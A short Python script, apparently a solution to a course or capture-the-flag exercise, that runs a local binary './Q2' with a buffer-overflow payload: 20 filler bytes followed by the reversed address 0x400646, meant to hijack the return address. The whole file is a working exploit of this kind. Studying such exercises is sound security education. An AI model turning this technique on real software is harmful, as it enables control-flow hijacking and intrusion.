#!/usr/bin/python3
# wrapper
import os
buff=20*(b'x')
addr=bytearray.fromhex("400646")
addr.reverse()
buff+=addr
print("exec ./Q2 with buff",buff)
os.execv('./Q2',['./Q2',buff]);
